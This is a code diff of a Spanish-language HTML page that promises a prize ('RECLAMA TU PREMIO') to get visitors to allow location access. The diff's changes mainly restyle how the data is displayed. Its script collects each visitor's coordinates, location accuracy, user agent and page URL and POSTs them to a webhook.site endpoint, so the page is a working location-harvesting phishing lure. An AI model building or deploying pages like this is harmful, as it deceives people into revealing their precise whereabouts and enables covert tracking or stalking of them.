@@ -16,23 +16,24 @@
       cursor: pointer;
     }
     button:hover { background: #0056b3; }
-    pre {
-      text-align: left;
+    .card {
       background: #fff;
-      padding: 10px;
+      padding: 15px;
       margin: 20px auto;
       width: 90%;
-      max-width: 600px;
-      border-radius: 6px;
+      max-width: 400px;
+      border-radius: 8px;
       box-shadow: 0px 2px 6px rgba(0,0,0,0.1);
-      overflow-x: auto;
+      text-align: left;
     }
+    .card p { margin: 6px 0; font-size: 15px; color: #333; }
     a {
       display: block;
-      margin-top: 20px;
+      margin-top: 15px;
       font-size: 18px;
       text-decoration: none;
       color: #007bff;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -41,15 +42,21 @@
   <p>Por favor, pulsa el botón y acepta la solicitud de ubicación.</p>
   <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
   <p id="msg" style="color:red;font-weight:bold;"></p>
-  <pre id="output"></pre>
-  <a id="mapsLink" target="_blank"></a>
+
+  <div class="card" id="info" style="display:none;">
+    <p><strong>Latitud:</strong> <span id="lat"></span></p>
+    <p><strong>Longitud:</strong> <span id="lon"></span></p>
+    <p><strong>Precisión:</strong> <span id="acc"></span> metros</p>
+    <p><strong>Fecha:</strong> <span id="time"></span></p>
+    <p><strong>Ruta:</strong> <a id="mapsLink" target="_blank">🌍 Abrir en Google Maps</a></p>
+  </div>
 
   <script>
     function enviarUbicacion(data) {
       fetch("https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify(data, null, 2)
       })
       .then(res => {
         if (!res.ok) throw new Error("Error HTTP " + res.status);
@@ -68,22 +75,29 @@
 
       navigator.geolocation.getCurrentPosition(
         pos => {
+          const mapsUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+
           const data = {
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
-            timestamp: new Date().toISOString(),
+            timestamp: new Date().toLocaleString(),
+            maps_link: mapsUrl,
             userAgent: navigator.userAgent,
-            maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
             source: window.location.href
           };
 
-          document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+          // Mostrar en pantalla
+          document.getElementById("info").style.display = "block";
+          document.getElementById("lat").textContent = data.lat;
+          document.getElementById("lon").textContent = data.lon;
+          document.getElementById("acc").textContent = data.accuracy;
+          document.getElementById("time").textContent = data.timestamp;
 
           const link = document.getElementById("mapsLink");
           link.href = data.maps_link;
-          link.textContent = "🌍 Abrir en Google Maps";
 
+          // Enviar al Webhook
           enviarUbicacion(data);
         },
         err => {
